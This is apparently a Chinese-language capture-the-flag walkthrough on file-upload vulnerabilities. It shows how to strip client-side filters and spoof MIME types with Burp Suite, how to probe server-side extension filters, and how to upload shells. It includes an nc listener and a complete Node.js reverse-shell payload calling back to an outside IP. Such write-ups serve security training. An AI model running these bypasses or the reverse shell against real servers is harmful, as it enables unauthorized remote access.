# 繞過Client-Side Filtering
![Image](https://i.imgur.com/6DbwdeF.png)

1. 先查看原始碼，同時間跑gobuster看看有那些檔案目錄
![Image](https://i.imgur.com/umrE61b.png)
看到filter的檔案，點進去
得知白名單為`png`檔案。

![Image](https://i.imgur.com/IkX17AW.png)

2. 查看gobuster結果
![Image](https://i.imgur.com/eSe60Ty.png)

上傳一張png圖片然後找我們的上傳資料夾是哪一個。
![Image](https://i.imgur.com/1pIcM9o.png)

![Image](https://i.imgur.com/cRWw8Qg.png)

看到是在`images`資料夾

3. 看到是在images資料夾
   啟動Burpsuite，之後重新整理頁面，Burpsuite會攔截到我們的Request封包，我們想要的是Response，所以右鍵選擇`Do intercept`，點選`Response to this request`。之後點選`Forword`。
![Image](https://i.imgur.com/CNhNDMw.png)

得到我們的Response後，找到之前在原始碼看到的filter，將其刪除之後點選`Forword`。
![Image](https://i.imgur.com/PPKoc8q.png)

之後我們就可以直接上傳我們的shell.php檔案了。
![Image](https://i.imgur.com/F5nlL9T.png)
![Image](https://i.imgur.com/bKS38x8.png)

接下來開nc接收reverse shell
```bash
nc -lvnp 1234
// 1234 是我的shell.php內設定的port，你可以在shell.php檔案內自行設定。
```
![Image](https://i.imgur.com/kVAGXq0.png)

P.S. 若沒開nc，直接點選shell.php會看到這個錯誤：
```bash
WARNING: Failed to daemonise. This is quite common and not fatal. Connection refused (111
```
![Image](https://i.imgur.com/74VocMb.png)

點選shell.php後獲得reverse shell
![Image](https://i.imgur.com/v65RUnb.png)

4. 第二種繞過方式：更改shell.php為合法的shell.png上傳，再利用Burpsuite修改我們的Request封包中的內容。
   現在shell.php為非法的檔案：
   ![Image](https://i.imgur.com/31QRrEw.png)

   修改為.png檔案，記得要先開Burpsuite攔截之後再點上傳(upload)。
   ![Image](https://i.imgur.com/nSFrkYJ.png)

   攔截到封包後修改MIME內容，再forword給server。(跟方法一區別，我把名字改成shell2.php)
   ![Image](https://i.imgur.com/YoADfeO.png)

   ![Image](https://i.imgur.com/agLvYx4.png)
   
   成功上傳。
   ![Image](https://i.imgur.com/iNXDVb9.png)

   開nc，拿到reverse shell。
   ![Image](https://i.imgur.com/XNmGWwc.png)

# 繞過server side filter
因為看不到server那邊的原始碼，所以無法得知實際上是怎麼做filter的，所以我們利用暴力法測試那些檔案是可以被上傳的，再試看看是否有方式可以繞過。

1. 嘗試一堆php的附檔名，可能有某一個可以被成功上傳。
   ![Image](https://i.imgur.com/lvxyGDg.png)
   ![Image](https://i.imgur.com/kN82tTH.png)

2. 假設`.jpg`可以上傳，那可以嘗試使用`XXX.jpg.php`上傳看看，有些檢測方式是抓 . 之後的來做filter，所以有機會可以使用此方式繞過。
   e.g.
   ![Image](https://i.imgur.com/ZjgbRrl.png)
   這一題嘗試了1.的第二張圖的所有附檔名，沒找到，又測試方法二也不行，最後是找到1.的圖一的.php5附檔名才成功繞過。

## challenge
![Image](https://i.imgur.com/jLzSXwj.png)

老樣子先在背景跑個gobuster
![Image](https://i.imgur.com/ClknauQ.png)
注意到有一個admin的資料夾是200可access的，進去看一眼。

注意到有一個admin的資料夾是200可access的，進去看一眼。
![Image](https://i.imgur.com/6YzZZMI.png)
    
再來看一下網站的組成：
![Image](https://i.imgur.com/zSZa627.png)
所以我們之前所使用的php的shell不適用，要改用的node.js的。

在[Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)找到node.js的payload，另存成shell.js (記得更改port和ip位址)
```bash
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "10.9.3.67", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

接下來看網站的原始碼找是否有client-site filter。
![Image](https://i.imgur.com/OyyVKxb.png)

利用burpsuite刪除filter來繞過。
這邊要注意的是我們可以在網頁原始碼看到filter是另外載入的，而Brupsuite預設是不會攔截js的，所以要自己去option的地方做修改 (按Edit將黃色螢光筆內`^js$`的部分刪除)。
![Image](https://i.imgur.com/PgeTWa5.png)

接下來就可以開啟Burpsuite，重新整理頁面。
forword封包直到找到upload.js的封包，根據前面的操作將其中的filter刪除後按forword。
![Image](https://i.imgur.com/5T47MzM.png)
接下來就可以關閉Burpsuite了。

由於我們能上傳的是jpg檔，加上gobuster的結果來看，猜測上傳檔案的地方在/content資料夾。
![Image](https://i.imgur.com/ak2GAcA.png)

為了之後方便比較，先用gobuster在掃一次content資料夾，並加上`-x jpg`掃副檔名為jpg的檔案。
![Image](https://i.imgur.com/ETFpwu7.png)

![Image](https://i.imgur.com/ueDdRdN.png)
上傳剛剛的shell.js，失敗，說明有server-site filter，所以我們按照他的需求改成jpg再上傳一次。

成功上傳。
![Image](https://i.imgur.com/sHRQMlT.png)

接下來gobuster再掃一次剛剛的content資料夾。
![Image](https://i.imgur.com/gOXTcB8.png)
對比之後發現多出了YCS.jpg的圖檔，應該就是我們剛剛上傳的檔案。

接下來開nc listening，然後回到admin網頁，輸入`../content/YCS.jpg`。
![Image](https://i.imgur.com/pnSm2QE.png)

get shell
![Image](https://i.imgur.com/SwC2YeZ.png)

